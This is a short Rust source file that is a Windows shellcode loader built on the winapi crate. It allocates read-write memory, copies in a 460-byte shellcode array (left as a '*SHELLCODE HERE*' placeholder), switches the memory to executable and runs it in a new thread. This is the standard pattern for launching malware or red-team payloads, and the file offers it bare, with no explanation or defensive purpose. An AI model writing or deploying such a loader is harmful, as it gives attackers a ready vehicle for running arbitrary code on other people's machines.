use std::ptr::null_mut;
use std::mem::transmute;

use winapi::um::memoryapi::{VirtualAlloc, WriteProcessMemory, VirtualProtect};
use winapi::um::processthreadsapi::{CreateThread, GetCurrentProcess};
use winapi::um::synchapi::{WaitForSingleObject};
use winapi::shared::minwindef::{LPVOID};
use winapi::shared::ntdef::HANDLE;


fn main(){
    let sh: [u8; 460] = [*SHELLCODE HERE*];

    unsafe {
        let alloc = VirtualAlloc(null_mut(), sh.len(), 0x00003000, 0x04);

        WriteProcessMemory(GetCurrentProcess(), alloc, sh.as_ptr() as LPVOID, sh.len(), null_mut());

        let mut old_protect = 0;
        VirtualProtect(alloc, sh.len(), 0x20, &mut old_protect);

        let thread: HANDLE = CreateThread(null_mut(), 0, Some(transmute(alloc)), null_mut(), 0, null_mut());
        
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }

}